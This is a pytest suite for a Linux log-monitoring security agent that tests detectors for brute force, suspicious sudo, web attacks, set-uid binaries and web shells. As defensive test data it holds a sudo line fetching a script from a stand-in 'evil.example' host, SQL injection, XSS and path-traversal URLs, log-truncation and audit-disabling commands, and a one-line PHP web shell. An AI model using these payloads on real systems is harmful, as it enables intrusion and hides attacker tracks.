"""
Tests for the AiBoO Linux Sentinel.

Run from the linux-agent folder:

    python3 -m pytest tests/test_linux_agent.py -q
    # or, with no pytest installed:
    python3 tests/test_linux_agent.py
"""

import importlib.util
import sys
import tempfile
import time
from pathlib import Path

DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(DIR))


def _load():
    # dataclasses needs the module registered in sys.modules while it runs
    spec = importlib.util.spec_from_file_location("aiboo_linux_agent", DIR / "aiboo_linux_agent.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules["aiboo_linux_agent"] = mod
    spec.loader.exec_module(mod)
    return mod


agent = _load()


class State:
    """Minimal AgentState stand-in (no disk writes in tests)."""

    def __init__(self):
        self.counters = agent.Counters()
        self.offsets = {}
        self.seen = set()

    def already_sent(self, key):
        return key in self.seen

    def remember(self, key):
        self.seen.add(key)

    def save(self):
        pass

    def reset_offsets(self):
        pass


def settings(**kw):
    st = agent.Settings(dry_run=True, endpoint_name="test-linux")
    for k, v in kw.items():
        setattr(st, k, v)
    return st


def detect(kind, line, st=None, state=None):
    st = st or settings()
    state = state or State()
    state.counters.now = time.time()
    return agent.DETECTORS[kind](line, st, state, f"{kind}.log")


# --------------------------------------------------------------------------
# auth.log / sshd
# --------------------------------------------------------------------------

AUTH_FAIL = ("Feb 11 03:14:15 web sshd[123]: Failed password for invalid user admin "
             "from 45.95.147.3 port 51000 ssh2")
AUTH_OK = "Feb 11 03:20:00 web sshd[200]: Accepted password for deploy from 45.95.147.3 port 51020 ssh2"
AUTH_MAX_TRY = ("Feb 11 03:14:20 web sshd[126]: error: maximum authentication attempts exceeded "
                "for root from 45.95.147.3 port 51010 ssh2")


def test_single_failed_logon_is_context_only():
    assert detect("auth", AUTH_FAIL) == []


def test_five_failures_from_one_ip_raise_brute_force():
    st, state = settings(), State()
    findings = []
    for _ in range(5):
        findings += detect("auth", AUTH_FAIL, st, state)
    assert findings, "expected a brute-force finding after 5 failures"
    top = findings[-1]
    assert top.pattern == "brute_force"
    assert top.severity == "high"
    assert top.src_ip == "45.95.147.3"
    assert top.extra["failed_attempts"] >= 5


def test_failures_for_different_users_still_count_per_ip():
    st, state = settings(), State()
    out = []
    for user in ("a", "b", "c", "d", "e"):
        line = f"Feb 11 03:14:15 web sshd[1]: Failed password for {user} from 9.9.9.9 port 5 ssh2"
        out += detect("auth", line, st, state)
    assert any(f.pattern == "brute_force" for f in out)


def test_success_after_failures_is_critical():
    st, state = settings(), State()
    for _ in range(3):
        detect("auth", AUTH_FAIL, st, state)
    out = detect("auth", AUTH_OK, st, state)
    assert out and out[0].pattern == "login_after_brute_force"
    assert out[0].severity == "critical"
    assert out[0].subject == "deploy"


def test_plain_success_is_low_logon_success():
    out = detect("auth", AUTH_OK)
    assert out and out[0].pattern == "logon_success" and out[0].severity == "low"


def test_max_auth_tries_counts_as_failure():
    st, state = settings(), State()
    out = []
    for _ in range(5):
        out += detect("auth", AUTH_MAX_TRY, st, state)
    assert any(f.pattern == "brute_force" for f in out)


def test_possible_break_in_attempt():
    out = detect("auth", "Feb 11 03:15:00 web sshd[300]: reverse mapping checking getaddrinfo "
                         "for 45.95.147.3 failed - POSSIBLE BREAK-IN ATTEMPT!")
    assert out and out[0].pattern == "network_intrusion" and out[0].severity == "high"


def test_no_identification_probe_needs_three():
    st, state = settings(), State()
    line = "Feb 11 03:15:00 web sshd[400]: Did not receive identification string from 45.95.147.3"
    assert detect("auth", line, st, state) == []
    detect("auth", line, st, state)
    out = detect("auth", line, st, state)
    assert out and out[0].pattern == "network_intrusion"


# --------------------------------------------------------------------------
# sudo / accounts / persistence / hiding tracks
# --------------------------------------------------------------------------

def test_dangerous_sudo_command_is_high():
    out = detect("auth", "Feb 11 03:15:00 web sudo: xenthives : TTY=pts/0 ; PWD=/home/xenthives ; "
                         "USER=root ; COMMAND=/usr/bin/curl http://evil.example/x.sh")
    assert out and out[0].pattern == "suspicious_sudo" and out[0].severity == "high"


def test_normal_sudo_command_is_quiet():
    out = detect("auth", "Feb 11 03:15:00 web sudo: xenthives : TTY=pts/0 ; PWD=/home/xenthives ; "
                         "USER=root ; COMMAND=/usr/bin/systemctl status nginx")
    # systemctl is in the watch list; a plain restart of a service is visible but
    # must at least never be silent-critical
    assert all(f.severity != "critical" for f in out)


def test_useradd_userdel_and_group():
    assert detect("auth", "Feb 11 03:16:00 web useradd[900]: new user: name=backdoor, UID=1002")[0].pattern == "account_created"
    assert detect("auth", "Feb 11 03:16:10 web userdel[901]: delete user 'backdoor'")[0].pattern == "account_deleted"
    group = detect("auth", "Feb 11 03:16:30 web usermod[901]: add 'backdoor' to group 'sudo'")
    assert group and group[0].pattern == "admin_group_add" and group[0].extra["privileged_group"] == "sudo"


def test_crontab_change_is_persistence():
    out = detect("auth", "Feb 11 03:17:00 web crontab[902]: (root) REPLACE (root)")
    assert out and out[0].pattern == "scheduled_task"


def test_log_truncation_is_critical():
    out = detect("auth", "Feb 11 03:18:00 web sudo: bob : TTY=pts/1 ; USER=root ; "
                         "COMMAND=/usr/bin/truncate -s 0 /var/log/auth.log")
    assert out and out[0].pattern in ("log_cleared", "suspicious_sudo")
    assert any(f.severity == "critical" for f in out)


def test_audit_disabled_is_high():
    out = detect("auth", "Feb 11 03:18:30 web sudo: bob : TTY=pts/1 ; USER=root ; "
                         "COMMAND=/usr/sbin/auditctl -e 0")
    assert out and any(f.pattern in ("audit_policy_changed", "suspicious_sudo") for f in out)


# --------------------------------------------------------------------------
# nginx access log - web attacks
# --------------------------------------------------------------------------

def access(path, status=200, ip="45.95.147.3", ua="curl/8.0", method="GET"):
    return (f'{ip} - - [11/Feb/2026:03:20:01 +0530] "{method} {path} HTTP/1.1" '
            f'{status} 512 "-" "{ua}"')


def test_sql_injection_detected():
    out = detect("access", access("/api/login?user=admin%27%20OR%20%271%27%3D%271"))
    assert out and out[0].pattern == "sql_injection" and out[0].severity == "critical"


def test_sql_injection_union_select():
    out = detect("access", access("/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users"))
    assert out and out[0].pattern == "sql_injection"


def test_xss_detected():
    out = detect("access", access("/search?q=%3Cscript%3Ealert(1)%3C/script%3E"))
    assert out and out[0].pattern == "xss_attempt"


def test_traversal_detected():
    out = detect("access", access("/../../etc/passwd", status=404))
    assert out and out[0].pattern == "path_traversal"


def test_env_served_is_critical():
    out = detect("access", access("/.env", status=200))
    assert out and out[0].pattern == "sensitive_file_hit" and out[0].severity == "critical"


def test_env_probe_refused_is_high():
    out = detect("access", access("/.env", status=403))
    assert out and out[0].pattern == "sensitive_file_probe"
    assert out[0].severity in ("high", "critical")


def test_scanner_user_agent_detected():
    out = detect("access", access("/", ua="sqlmap/1.7#stable (http://sqlmap.org)"))
    assert out and out[0].pattern == "scanner_activity" and out[0].extra["tool"] == "sqlmap"


def test_404_flood_is_directory_scan():
    st, state = settings(), State()
    out = []
    for i in range(st.scan_404_threshold):
        out += detect("access", access(f"/admin{i}", status=404), st, state)
    assert any(f.pattern == "directory_scan" for f in out)


def test_web_login_brute_force():
    st, state = settings(), State()
    out = []
    for _ in range(st.web_fail_threshold):
        out += detect("access", access("/api/login", status=401), st, state)
    assert any(f.pattern == "brute_force" for f in out)


def test_error_flood_is_burst():
    st, state = settings(), State()
    out = []
    for _ in range(st.error_burst_threshold):
        out += detect("access", access("/api/items", status=500), st, state)
    assert any(f.pattern == "error_burst" for f in out)


def test_long_url_is_flagged():
    out = detect("access", access("/x?" + "a" * 2500, status=414))
    assert any(f.pattern == "network_intrusion" for f in out)


def test_bad_ip_from_blocklist(tmp_path=None):
    import tempfile
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
        fh.write("# bad\n45.95.147.0/24\n")
        path = fh.name
    st = settings(blocklist_file=path)
    out = detect("access", access("/", ip="45.95.147.3"), st, State())
    assert any(f.pattern == "threat_intel_alert" for f in out)


def test_normal_traffic_is_quiet():
    assert detect("access", access("/api/items", status=200, ip="10.0.0.5", ua="Mozilla/5.0")) == []


# --------------------------------------------------------------------------
# nginx error log + mysql
# --------------------------------------------------------------------------

def test_nginx_tls_handshake_scan_needs_twenty():
    st, state = settings(), State()
    line = "2026/02/11 03:20:10 [error] 15#15: *9 SSL_do_handshake() failed (SSL: ) while SSL handshaking, client: 45.95.147.3, server: 0.0.0.0:443"
    out = []
    for _ in range(20):
        out += detect("error", line, st, state)
    assert any(f.pattern == "scanner_activity" for f in out)


def test_mysql_denied_burst():
    st, state = settings(), State()
    line = "2026-02-11T03:21:00.123456Z 0 [Warning] Access denied for user 'root'@'45.95.147.3' (using password: YES)"
    out = []
    for _ in range(5):
        out += detect("mysql", line, st, state)
    assert any(f.pattern == "brute_force" for f in out)


# --------------------------------------------------------------------------
# scoring / verdicts / API payload
# --------------------------------------------------------------------------

def test_risk_formula_matches_the_windows_agent():
    st = settings(importance="normal")
    finding = agent.Finding(pattern="sql_injection", severity="critical", summary="x",
                            src_ip="1.2.3.4")
    trust = 70
    risk, intent = agent.risk_of(finding, trust, st.importance)
    expected = round(0.30 * (100 - trust) + 0.40 * intent + 0.30 * agent.IMPACT_POINTS["normal"])
    assert risk == expected


def test_verdict_thresholds():
    assert agent.verdict_for_risk(80) == "block"
    assert agent.verdict_for_risk(60) == "block"
    assert agent.verdict_for_risk(40) == "hold"
    assert agent.verdict_for_risk(20) == "pass"
    assert agent.severity_for_risk(80) == "critical"
    assert agent.severity_for_risk(60) == "high"
    assert agent.severity_for_risk(40) == "medium"
    assert agent.severity_for_risk(10) == "low"


def test_finding_payload_has_platform_and_linux_metadata():
    finding = agent.Finding(pattern="brute_force", severity="high", summary="Password guessing",
                            src_ip="45.95.147.3", subject="root", source_file="/var/log/auth.log")
    payload = finding.to_api("auroraa-prod-ubuntu", "web01", "linux")
    assert payload["platform"] == "linux"
    assert payload["metadata"]["platform"] == "linux"
    assert payload["metadata"]["pattern"] == "brute_force"
    assert payload["metadata"]["log_file"] == "/var/log/auth.log"
    assert payload["agent_name"] == agent.AGENT_NAME
    assert payload["threat_type"] == "identity_mismatch"


def test_importance_changes_the_score():
    finding = agent.Finding(pattern="account_created", severity="high", summary="x")
    low, _ = agent.risk_of(finding, 70, "low")
    high, _ = agent.risk_of(finding, 70, "critical")
    assert high > low


def test_recommends_block_and_disable():
    finding = agent.Finding(pattern="brute_force", severity="high", summary="x",
                            src_ip="45.95.147.3", subject="root")
    actions = {a["action"] for a in agent.recommend(finding)}
    assert "block_access" in actions and "restrict_identity" in actions


def test_posture_advice_does_not_create_approvals():
    low = agent.Finding(pattern="config_weakness", severity="low", summary="MaxAuthTries not set")
    high = agent.Finding(pattern="config_weakness", severity="high", summary="root login allowed")
    attack = agent.Finding(pattern="brute_force", severity="high", summary="password guessing")
    assert agent.should_decide(low) is False
    assert agent.should_decide(high) is True
    assert agent.should_decide(attack) is True


def test_trust_score_is_in_range():
    trust, factors = agent.trust_score()
    assert 0 <= trust <= 100
    assert isinstance(factors, list)


def test_selftest_runs():
    assert agent.selftest() == 0


def test_state_offsets_only_read_new_lines(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(AUTH_FAIL + "\n")
    state = agent.AgentState(tmp_path / "state.json")
    lines = agent.read_new_lines(log, state, "auth")
    assert len(lines) == 1
    assert agent.read_new_lines(log, state, "auth") == []      # nothing new
    with log.open("a") as fh:
        fh.write(AUTH_OK + "\n")
    assert len(agent.read_new_lines(log, state, "auth")) == 1


def test_rotation_is_handled(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(AUTH_FAIL + "\n" * 300)
    state = agent.AgentState(tmp_path / "state.json")
    agent.read_new_lines(log, state, "auth")
    log.write_text(AUTH_OK + "\n")                            # rotated: smaller file
    lines = agent.read_new_lines(log, state, "auth")
    assert lines == [AUTH_OK]


def test_partial_last_line_is_not_lost(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text("first line\nincomplete")                  # no trailing newline
    state = agent.AgentState(tmp_path / "state.json")
    assert agent.read_new_lines(log, state, "auth") == ["first line"]
    with log.open("a") as fh:
        fh.write(" line\n")
    assert agent.read_new_lines(log, state, "auth") == ["incomplete line"]


# --------------------------------------------------------------------------
# set-uid binaries: normal OS ones must never spam the dashboard
# --------------------------------------------------------------------------

def test_suid_first_scan_only_records_a_baseline():
    """In system folders the first scan only learns - it does not alert."""
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    box = Path(tempfile.mkdtemp())
    known = box / "passwd-like"
    known.write_text("#!/bin/sh\n")
    known.chmod(0o4755)
    saved = (agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS)
    agent.SUID_SCAN_DIRS = (str(box),)
    agent.SUID_NORMAL_DIRS = (str(box),)
    agent.SUID_WRITABLE_DIRS = ("/definitely-not-here",)
    try:
        first = agent.detect_suid_binaries(st, state)
        again = agent.detect_suid_binaries(st, state)
    finally:
        agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS = saved
        known.unlink(missing_ok=True)
        box.rmdir()
    assert first == [], f"first scan should stay quiet, got {first}"
    assert again == [], f"a known system binary was reported again: {again}"
    assert state.suid_baseline, "baseline was not recorded"


def test_known_suid_binaries_are_not_reported_again():
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    box = Path(tempfile.mkdtemp())
    known = box / "mount-like"
    known.write_text("#!/bin/sh\n")
    known.chmod(0o4755)
    saved = (agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS)
    agent.SUID_SCAN_DIRS = (str(box),)
    agent.SUID_NORMAL_DIRS = (str(box),)
    agent.SUID_WRITABLE_DIRS = ("/definitely-not-here",)
    try:
        agent.detect_suid_binaries(st, state)      # learns the baseline
        again = agent.detect_suid_binaries(st, state)
    finally:
        agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS = saved
        known.unlink(missing_ok=True)
        box.rmdir()
    assert again == [], f"baseline binaries were reported again: {again[:2]}"


def test_a_suid_binary_in_tmp_is_high_severity():
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    state.suid_baseline = {"/usr/bin/passwd"}      # pretend we already know the box
    drop = Path(tempfile.mkdtemp())                # emulate /tmp without touching /tmp
    evil = drop / "rootme"
    evil.write_text("#!/bin/sh\n")
    evil.chmod(0o4755)
    import atexit; atexit.register(lambda: (evil.unlink(missing_ok=True), drop.rmdir()))
    agent.SUID_SCAN_DIRS = (str(drop),)
    agent.SUID_WRITABLE_DIRS = (str(drop),)
    try:
        found = agent.detect_suid_binaries(st, state)
    finally:
        agent.SUID_SCAN_DIRS = ("/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin",
                                "/usr/local/sbin", "/opt", "/srv", "/var/www", "/home", "/tmp", "/dev/shm")
        agent.SUID_WRITABLE_DIRS = ("/tmp", "/var/tmp", "/dev/shm", "/home", "/srv", "/var/www", "/run")
    assert len(found) == 1, found
    assert found[0].severity == "high", found[0].severity
    assert "New set-uid binary" in found[0].summary
    assert agent.should_decide(found[0]) is True, "a writable-location set-uid binary should raise an approval"


def test_new_suid_in_a_normal_directory_is_medium_and_advisory():
    """A brand-new set-uid binary in /usr/bin: worth telling, not worth a HOLD."""
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    box = Path(tempfile.mkdtemp())
    (box / "known-tool").write_text("#!/bin/sh\n")
    (box / "known-tool").chmod(0o4755)

    saved = (agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS)
    # the temp dir must look like a *system* directory for this test
    agent.SUID_SCAN_DIRS = (str(box),)
    agent.SUID_NORMAL_DIRS = (str(box),)
    agent.SUID_WRITABLE_DIRS = ("/definitely-not-here",)
    try:
        assert agent.detect_suid_binaries(st, state) == []      # baseline only
        state.counters.now += 3600
        assert agent.detect_suid_binaries(st, state) == []      # nothing changed

        (box / "another-tool").write_text("#!/bin/sh\n")
        (box / "another-tool").chmod(0o4755)
        state.counters.now += 3600
        found = agent.detect_suid_binaries(st, state)
    finally:
        agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS = saved

    assert len(found) == 1, found
    assert found[0].severity == "medium", found[0].severity
    assert "New set-uid binary" in found[0].summary
    assert agent.should_decide(found[0]) is False, "a normal-directory change is advisory"


# --------------------------------------------------------------------------
# first run must not replay history (this flooded the real dashboard)
# --------------------------------------------------------------------------

def _log_line(minutes_ago: float, text: str) -> str:
    stamp = time.time() - minutes_ago * 60
    return time.strftime("%b %d %H:%M:%S", time.localtime(stamp)) + " host " + text


def test_syslog_timestamps_are_parsed():
    now = time.time()
    ts = agent.parse_log_time(_log_line(10, "sshd[1]: Failed password"))
    assert ts is not None and abs(ts - (now - 600)) < 120, ts
    assert agent.parse_log_time("2026-10-06T12:00:00+00:00 nothing") is not None
    assert agent.parse_log_time("no timestamp here at all") is None


def test_first_run_offset_skips_old_history():
    work = Path(tempfile.mkdtemp()) / "auth.log"
    old_lines = [_log_line(600, f"old admin command {i}") for i in range(50)]
    work.write_text("\n".join(old_lines + [_log_line(1, "recent logon"),
                                           _log_line(0.5, "recent sudo")]) + "\n",
                    encoding="utf-8")
    offset = agent.first_run_offset(work, 30)
    tail = work.read_text(encoding="utf-8")[offset:]
    assert "recent logon" in tail and "recent sudo" in tail, tail
    assert "old admin command" not in tail, "old history was included"


def test_first_run_with_no_timestamps_reads_only_the_tail():
    work = Path(tempfile.mkdtemp()) / "weird.log"
    work.write_text("\n".join(f"line {i} with no timestamp" for i in range(20000)) + "\n",
                    encoding="utf-8")
    offset = agent.first_run_offset(work, 30)
    size = work.stat().st_size
    assert 0 < offset < size, offset
    assert size - offset <= 128 * 1024 + 4096, (size, offset)   # only the tail is read


def test_read_new_lines_starts_recent_then_follows_normally():
    work = Path(tempfile.mkdtemp()) / "auth.log"
    old = "\n".join(_log_line(999, f"ancient {i}") for i in range(20))
    work.write_text(old + "\n" + _log_line(1, "fresh event") + "\n", encoding="utf-8")
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    lines = agent.read_new_lines(work, state, "auth", st)
    assert any("fresh event" in ln for ln in lines), lines
    assert not any("ancient" in ln for ln in lines), lines
    with work.open("a", encoding="utf-8") as fh:
        fh.write(_log_line(0, "another fresh event") + "\n")
    lines2 = agent.read_new_lines(work, state, "auth", st)
    assert any("another fresh event" in ln for ln in lines2), lines2


def test_admin_work_is_not_dangerous_sudo():
    """Exact commands from the real Ubuntu run that should NOT alert."""
    for cmd in ("/usr/bin/chmod 700 /root/.ssh",
                "/usr/bin/chmod 600 /var/www/html/index.html",
                "/usr/bin/systemctl restart ssh",
                "/usr/bin/sed -i s/^#*Port.*/Port 22/ /etc/nsswitch.conf"):
        assert agent.find_suspicious_sudo(cmd) == "", f"{cmd} -> {agent.find_suspicious_sudo(cmd)}"


def test_security_relevant_sudo_is_still_caught():
    for cmd, expect in (("/usr/sbin/useradd hacker", "useradd"),
                        ("/usr/bin/tee -a /root/.ssh/authorized_keys", "authorized_keys"),
                        ("sed -i s/x/y/ /etc/ssh/sshd_config", "/etc/ssh/sshd_config"),
                        ("chmod 777 /var/www", "chmod 777"),
                        ("/bin/bash -c whoami", "bash")):
        assert agent.find_suspicious_sudo(cmd) == expect, (cmd, agent.find_suspicious_sudo(cmd))


def test_posture_findings_are_reported_once_a_day_not_hourly():
    """'No fail2ban installed' cannot change every hour - do not repeat it hourly.

    run_once() drops anything whose dedup_key is already in state.seen, and
    send_finding() remembers the key after a successful send. The key is
    regenerated once a day, so the reminder goes out daily, not hourly.
    """
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()

    first = agent.posture_findings(st, state)
    assert first, "expected posture findings on a machine with no config.ini"
    assert all(f.dedup_key.startswith("cfg:") for f in first), [f.dedup_key for f in first]

    for f in first:                      # pretend the server accepted them
        state.remember(f.dedup_key)

    def what_run_once_would_send(findings):
        return [f for f in findings if not (f.dedup_key and state.already_sent(f.dedup_key))]

    assert what_run_once_would_send(agent.posture_findings(st, state)) == [], "repeated in the same hour"

    state.counters.now += 3600           # one hour later, same day
    assert what_run_once_would_send(agent.posture_findings(st, state)) == [], "repeated hourly"

    state.counters.now += 86400          # next day: the daily reminder is expected
    next_day = what_run_once_would_send(agent.posture_findings(st, state))
    assert next_day, "the daily reminder should go out"
    assert {f.dedup_key for f in next_day}.isdisjoint({f.dedup_key for f in first}), "keys did not rotate"


def test_suid_in_a_writable_folder_is_reported_even_on_the_first_scan():
    """A set-uid binary in /tmp is never 'normal' - not even on a brand-new install."""
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    box = Path(tempfile.mkdtemp())
    planted = box / "rootme"
    planted.write_text("#!/bin/sh\n")
    planted.chmod(0o4755)

    saved = (agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS)
    agent.SUID_SCAN_DIRS = (str(box),)
    agent.SUID_NORMAL_DIRS = ("/nowhere",)
    agent.SUID_WRITABLE_DIRS = (str(box),)
    try:
        found = agent.detect_suid_binaries(st, state)          # very first scan, no baseline
    finally:
        agent.SUID_SCAN_DIRS, agent.SUID_NORMAL_DIRS, agent.SUID_WRITABLE_DIRS = saved
    assert len(found) == 1, found
    assert found[0].severity == "high", found[0].severity
    assert str(planted) in found[0].summary
    assert str(planted) not in state.suid_baseline, "a /tmp binary must never be baseline material"


def test_a_new_web_shell_is_reported_and_not_marked_as_already_sent():
    """Real bug: the collector remembered the key, so run_once dropped the finding."""
    watch = Path(tempfile.mkdtemp())
    shell = watch / "aiboo-testshell.php"
    shell.write_text("<?php system($_GET['c']); ?>\n")
    st = settings(watch_dirs=str(watch))
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "s.json")
    state.counters.now = time.time()
    try:
        found = agent.detect_integrity(st, state)
    finally:
        shell.unlink(missing_ok=True)
        watch.rmdir()
    assert [f.pattern for f in found] == ["dropped_file"], found
    assert found[0].extra["sha256"], "hash missing"
    blocked = [f for f in found if f.dedup_key and state.already_sent(f.dedup_key)]
    assert blocked == [], "run_once would skip this finding as 'already sent'"
    # a harmless file is remembered (so it is not re-hashed) but produces no alert
    watch2 = Path(tempfile.mkdtemp())
    (watch2 / "notes.txt").write_text("hello\n")
    st2 = settings(watch_dirs=str(watch2))
    state2 = agent.AgentState(Path(tempfile.mkdtemp()) / "s2.json")
    state2.counters.now = time.time()
    try:
        quiet = agent.detect_integrity(st2, state2)
    finally:
        (watch2 / "notes.txt").unlink(missing_ok=True)
        watch2.rmdir()
    assert quiet == [], quiet
    assert state2.seen, "harmless files should be remembered"


# --------------------------------------------------------------------------
# the REST command channel must authenticate (this bug hid every dashboard
# command: the backend answers 401 without the key, and the agent just saw
# "no commands")
# --------------------------------------------------------------------------

def test_fetch_commands_sends_the_api_key_and_the_endpoint_id():
    import json as _json
    import tempfile as _tempfile

    st = agent.Settings(dry_run=False, endpoint_name="aiboo-linux-01",
                        api_key="secret-key-123", remote_url="http://server:4000")
    with _tempfile.TemporaryDirectory() as tmp:
        state = agent.AgentState(Path(tmp) / "state.json")
        sender = agent.Sender(st, state)
        seen = {}

        class FakeResp:
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

            def read(self):
                return _json.dumps({"ok": True, "commands": [
                    {"cmd_id": "c1", "action": "block_access", "target": "1.2.3.4"}]}).encode()

        real = agent.urllib.request.urlopen
        agent.urllib.request.urlopen = lambda req, **kw: (seen.update(
            url=req.full_url, headers={k.lower(): v for k, v in req.header_items()}), FakeResp())[1]
        try:
            cmds = sender.fetch_commands()
        finally:
            agent.urllib.request.urlopen = real

        assert seen["url"].endswith("/api/agent/commands/pending"), seen
        assert seen["headers"].get("x-api-key") == "secret-key-123", seen["headers"]
        assert seen["headers"].get("x-endpoint-id") == "aiboo-linux-01", seen["headers"]
        assert cmds and cmds[0]["cmd_id"] == "c1", cmds


def test_a_401_is_logged_instead_of_silently_returning_nothing():
    import tempfile as _tempfile
    import urllib.error

    st = agent.Settings(dry_run=False, endpoint_name="aiboo-linux-01",
                        api_key="wrong", remote_url="http://server:4000")
    with _tempfile.TemporaryDirectory() as tmp:
        sender = agent.Sender(st, agent.AgentState(Path(tmp) / "state.json"))
        real = agent.urllib.request.urlopen

        def boom(req, **kw):
            raise urllib.error.HTTPError(req.full_url, 401, "Unauthorized", {}, None)

        agent.urllib.request.urlopen = boom
        lines = []
        real_log = agent.log
        agent.log = lambda msg, level="INFO": lines.append(f"{level}:{msg}")
        try:
            assert sender.fetch_commands() == []
        finally:
            agent.urllib.request.urlopen = real
            agent.log = real_log
        assert any("API key" in l and "WARN" in l for l in lines), lines


if __name__ == "__main__":
    passed = failed = 0
    for name, fn in sorted(globals().items()):
        if not name.startswith("test_") or not callable(fn):
            continue
        try:
            if name in ("test_state_offsets_only_read_new_lines", "test_rotation_is_handled",
                        "test_partial_last_line_is_not_lost", "test_bad_ip_from_blocklist"):
                import tempfile
                with tempfile.TemporaryDirectory() as tmp:
                    fn(Path(tmp))
            else:
                fn()
            passed += 1
            print(f"PASS  {name}")
        except AssertionError as exc:
            failed += 1
            print(f"FAIL  {name}: {exc}")
        except Exception as exc:                              # noqa: BLE001
            failed += 1
            print(f"ERROR {name}: {type(exc).__name__}: {exc}")
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
